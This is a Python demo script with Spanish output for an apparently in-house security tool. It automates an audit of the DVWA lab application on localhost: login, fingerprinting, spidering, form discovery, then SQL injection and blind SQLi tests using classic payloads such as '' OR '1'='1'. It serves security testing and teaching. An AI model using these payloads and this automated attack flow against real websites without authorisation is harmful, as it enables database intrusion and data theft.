import asyncio
import os
from dotenv import load_dotenv
from core.browser import browser_manager
from core.auth import login_dvwa
from modules.spider import Spider
from modules.forms import FormDiscoverer
from modules.fingerprint import TechFingerprinter
from modules.attacker import WebAttacker
from utils.reporter import EventReporter

load_dotenv()

TARGET = "http://localhost:8888"

async def run_demo():
    print("\n" + "="*60)
    print(" HookSuite — DEMO de auditoría automatizada")
    print(" Objetivo: DVWA (Damn Vulnerable Web Application)")
    print("="*60)

    reporter = EventReporter("demo_session")
    await reporter.check_backend()

    print("\n[PASO 1] Iniciando navegador...")
    await browser_manager.start()
    context = await browser_manager.new_context()
    page = await browser_manager.new_page(context)

    print("[PASO 2] Autenticándose en DVWA...")
    await login_dvwa(page)

    print("[PASO 3] Detectando tecnologías del objetivo...")
    fingerprinter = TechFingerprinter()
    fingerprint = await fingerprinter.fingerprint(page, TARGET)
    print(f" → Tecnologías detectadas: {fingerprint['technologies']}")
    print(f" → Prioridades de ataque: {fingerprint['attack_priorities']}")

    print("\n[PASO 4] Mapeando la aplicación web (spider)...")
    spider = Spider(base_url=TARGET, max_pages=8)
    urls = await spider.run(page)
    print(f" → {len(urls)} URLs descubiertas automáticamente")

    print("\n[PASO 5] Descubriendo formularios vulnerables...")
    form_discoverer = FormDiscoverer()
    target_url = f"{TARGET}/vulnerabilities/sqli/"
    forms = await form_discoverer.discover_forms(page, target_url)
    print(f" → {len(forms)} formularios encontrados en la página SQLi")

    if not forms:
        print(" ✗ No se encontraron formularios. Usando configuración manual.")
        forms = [{
            "url": target_url,
            "action": target_url,
            "method": "GET",
            "fields": [{"name": "id", "type": "text", "value": ""}],
            "injectable_fields": [{"name": "id", "type": "text", "value": ""}],
        }]

    print("\n[PASO 6] Lanzando ataque SQL Injection...")
    attacker = WebAttacker()
    form = forms[0]
    target_field = form["injectable_fields"][0]["name"] if form["injectable_fields"] else "id"

    payloads_to_test = [
        "' OR '1'='1",
        "' OR '1'='1'--",
        "1 UNION SELECT null,null--",
    ]

    vulnerability_found = False
    for payload in payloads_to_test:
        print(f" → Probando payload: {payload}")
        result = await attacker.fill_form_with_payload(page, form, target_field, payload)
        if result.get("anomalies"):
            print(f"\n ⚠️ VULNERABILIDAD DETECTADA!")
            print(f" → Tipo: SQL Injection")
            print(f" → Payload: {payload}")
            print(f" → Anomalías: {result['anomalies']}")
            print(f" → Captura guardada: {result.get('screenshot_after')}")
            await reporter.send_vulnerability({
                "id": "demo_vuln_1",
                "tipo": "SQL Injection",
                "severidad": "critical",
                "titulo": "SQL Injection confirmado en DVWA",
                "descripcion": f"El campo '{target_field}' es vulnerable a SQL Injection.",
                "url": target_url,
                "payload": payload,
                "anomalies": result["anomalies"],
                "recomendacion": "Usar consultas preparadas con parámetros enlazados.",
            })
            vulnerability_found = True
            break

    if not vulnerability_found:
        print(" → No se detectaron anomalías con los payloads probados")

    print("\n[PASO 7] Probando Blind SQLi...")
    blind_result = await attacker.test_sqli_blind_boolean(page, form, target_field)
    if blind_result.get("vulnerable"):
        print(f" ⚠️ Blind SQLi confirmado! Diferencia en respuestas: {blind_result['difference']} caracteres")
    else:
        print(f" → Sin indicios de Blind SQLi")

    reporter.save_local_log()
    attacker.save_results()

    print("\n" + "="*60)
    print(" DEMO COMPLETADA")
    print(f" Vulnerabilidades encontradas: {'SÍ' if vulnerability_found else 'NO'}")
    print(f" Resultados guardados en: results/")
    print("="*60 + "\n")

    await browser_manager.stop()

if __name__ == "__main__":
    asyncio.run(run_demo())